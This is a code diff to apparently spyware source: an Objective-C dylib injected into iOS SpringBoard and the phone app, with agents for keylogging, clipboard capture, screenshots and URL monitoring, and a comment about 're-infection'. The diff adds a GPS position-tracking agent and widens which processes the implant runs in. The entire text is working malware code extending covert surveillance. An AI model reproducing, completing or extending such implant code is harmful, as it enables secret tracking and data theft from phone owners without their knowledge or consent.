@@ -34,6 +34,7 @@
 #import "RCSIAgentScreenshot.h"
 #import "RCSIAgentURL.h"
 #import "RCSIAgentPasteboard.h"
+#import "RCSIAgentGPS.h"
 
 #import "ARMHooker.h"
 
@@ -47,6 +48,7 @@
 
 static BOOL gInitAlreadyRunned  = FALSE;
 static char gDylibPath[256];
+NSString *gBundleIdentifier = nil;
 
 #ifdef __DEBUG_IOS_DYLIB
 /*
@@ -59,8 +61,9 @@ void catch_me();
  */
 #endif
 
-extern "C" void init();
-extern "C" void checkInit(char *dylibName);
+void init(void);
+void checkInit(char *dylibName);
+BOOL threadIt(void);
 
 static void TurnWifiOn(CFNotificationCenterRef center, 
                        void *observer,
@@ -90,10 +93,21 @@ static void TurnWifiOff(CFNotificationCenterRef center,
 #pragma mark - entry point
 #pragma mark -
 
+BOOL threadIt(void)
+{
+  gBundleIdentifier  = [[[NSBundle mainBundle] bundleIdentifier] retain];
+  
+  if ([gBundleIdentifier compare: SPRINGBOARD] == NSOrderedSame ||
+      [gBundleIdentifier compare: MOBILEPHONE] == NSOrderedSame)
+    return TRUE;
+  else
+    return FALSE;
+}
+
 /*
  * dylib entry point
  */
-extern "C" void init()
+void init(void)
 {
   NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
   
@@ -114,9 +128,8 @@ extern "C" void init()
    * --
    */
 #else
-  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
   
-  if ([bundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
+  if (threadIt() == TRUE)
     {
       [dyilbMod threadDylibMainRunLoop];
     }
@@ -135,7 +148,7 @@ extern "C" void init()
 /*
  * runned by injected thread for SB re-infection
  */
-extern "C" void checkInit(char *dylibName)
+void checkInit(char *dylibName)
 {
   if (dylibName != NULL)
     snprintf(gDylibPath, sizeof(gDylibPath), "%s", dylibName);
@@ -380,6 +393,18 @@ void catch_me()
 #pragma mark - Agents management 
 #pragma mark -
 
+- (NSData*)getConfigData:(RCSIDylibBlob*)aBlob
+{
+  NSData *retData = nil;
+  
+  blob_t *tmpBlob = (blob_t*)[[aBlob blob] bytes];
+  
+  if (tmpBlob->size > 0)
+  retData = [NSData dataWithBytes:tmpBlob->blob length: tmpBlob->size];
+  
+  return retData;
+}
+
 - (RCSIAgent*)agentAllocate:(RCSIDylibBlob*)aBlob
 {
   RCSIAgent *agent = nil;
@@ -387,20 +412,34 @@ void catch_me()
   switch ([aBlob type]) 
   {
     case AGENT_URL:
+    { 
       agent = [[agentURL alloc] init];
-    break;
+      break;
+    }
     case AGENT_APPLICATION:
+    { 
       agent = [[agentApplication alloc] init];
-    break;
-    case AGENT_KEYLOG:
+      break;
+    }case AGENT_KEYLOG:
+    {
       agent = [[agentKeylog alloc] init];
     break;
+    }
     case AGENT_CLIPBOARD:
+    {
       agent = [[agentPasteboard alloc] init];
-    break;
+      break;
+    }
     case AGENT_SCREENSHOT:
+    {
       agent = [[agentScreenshot alloc] init];
-    break;
+      break;
+    }
+    case AGENT_POSITION:
+    {
+      agent = [[agentPosition alloc] initWithConfigData:[self getConfigData:aBlob]];
+      break;
+    }
   }
   return agent;
 }
@@ -414,9 +453,12 @@ void catch_me()
   for (int i=0; i < [mAgentsArray count]; i++) 
     {
       id agentTmp = [mAgentsArray objectAtIndex:i];
+      
       if (agentId == [agentTmp mAgentID])
         {
           agent = agentTmp;
+          NSData *tmpConfigData = [self getConfigData: aBlob];
+          [agent setMAgentConfiguration: tmpConfigData];
           break;
         }
     }
@@ -483,6 +525,7 @@ void catch_me()
     case AGENT_APPLICATION:
     case AGENT_KEYLOG:
     case AGENT_CLIPBOARD:
+    case AGENT_POSITION:
       if ([aBlob getAttribute: DYLIB_AGENT_START_ATTRIB] == TRUE)
           [self startAgent: aBlob];
       else
